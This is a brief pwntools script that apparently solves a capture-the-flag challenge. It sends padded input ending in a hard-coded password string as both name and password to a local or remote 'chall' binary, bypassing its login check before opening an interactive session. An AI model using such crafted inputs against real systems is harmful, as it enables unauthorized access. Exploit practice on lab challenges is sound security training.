import pwn

pwn.context.terminal = ["tmux", "splitw", "-h"]
elf = pwn.context.binary = pwn.ELF("./chall")
libc = pwn.ELF("./libc.so.6")
if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path, gdbscript="""b *0x00005555555553d2\nc""")
elif pwn.args.REMOTE:
    io = pwn.remote()
else:
    io = elf.process()

name = b"Esharky"
password = b"A" * 8 + b"B" * 3 + b"ss3cur3_p4ssw0rd"
name = password
io.sendlineafter(b":\n", name)
io.sendlineafter(b":\n", password)
io.interactive()
